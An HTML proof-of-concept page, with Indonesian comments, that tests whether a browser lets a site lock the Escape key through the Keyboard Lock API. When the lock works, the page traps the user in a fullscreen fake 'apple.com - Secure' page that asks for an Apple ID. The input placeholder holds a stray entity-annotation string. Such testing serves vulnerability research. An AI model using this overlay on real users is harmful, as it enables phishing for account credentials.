<button onclick="lockKeys()">TEST KEYBOARD LOCK BYPASS</button>
<div id="fake" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999;">
  <h1>🔒 apple.com - Secure</h1>
  <p>ESC sudah di-lock, ga bisa keluar!</p>
  <input placeholder="【entity-Apple¦canonical_name=Apple】 ID">
</div>
<script>
async function lockKeys(){
  try{
    // Coba lock ESC - seharusnya ga boleh di-lock menurut spec
    await navigator.keyboard.lock(["Escape", "Meta", "Tab"]);
    document.getElementById('fake').style.display='block';
    await document.documentElement.requestFullscreen();
    alert("Keyboard Lock berhasil! Coba tekan ESC - kalau ga bisa keluar fullscreen = BUG SPOOFING! Phishing valid Medium");
  }catch(e){
    alert("SAFE - Keyboard Lock ditolak: "+e.name+" - "+e.message);
    // Kalau ditolak = aman, kalau berhasil lock ESC = bug
  }
}
</script>
